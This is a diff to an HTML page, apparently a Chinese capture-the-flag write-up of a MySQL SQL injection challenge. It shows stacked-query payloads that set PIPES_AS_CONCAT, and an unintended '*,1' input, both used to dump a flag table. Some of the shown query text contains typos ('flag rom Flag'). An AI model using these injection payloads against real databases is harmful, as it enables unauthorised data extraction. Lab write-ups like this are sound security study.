@@ -262,7 +262,7 @@ mysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);
         -&gt; NULL
 mysql&gt; SELECT CONCAT(14.3);
         -&gt; &apos;14.3&apos;</code></pre><p>我们通过<code>sql_mode=PIPES_AS_CONCAT</code>来将flag带出来</p>
-<p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1;</code>  </p>
+<p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1</code>  </p>
 <p>语句为:</p>
 <pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>payload:<code>*,1</code>构造<code>select *,1 || flag from Flag;</code> 即可查出全部内容。</p>
 
